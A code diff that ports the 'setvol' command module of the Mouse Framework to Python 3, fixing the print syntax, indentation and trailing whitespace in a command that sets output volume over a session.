@@ -1,7 +1,7 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #            ---------------------------------------------------
-#                              Mouse Framework                                 
+#                              Mouse Framework
 #            ---------------------------------------------------
 #                Copyright (C) <2019-2020>  <Entynetproject>
 #
@@ -23,9 +23,9 @@ class command:
         self.name = "setvol"
         self.description = "Set output volume."
         self.usage = "Usage: setvol <level: 0-1>"
-    
+
     def run(self,session,cmd_data):
-    	if not cmd_data['args']:
-    		print self.usage
-    		return
+        if not cmd_data['args']:
+            print(self.usage)
+            return
         session.send_command(cmd_data)
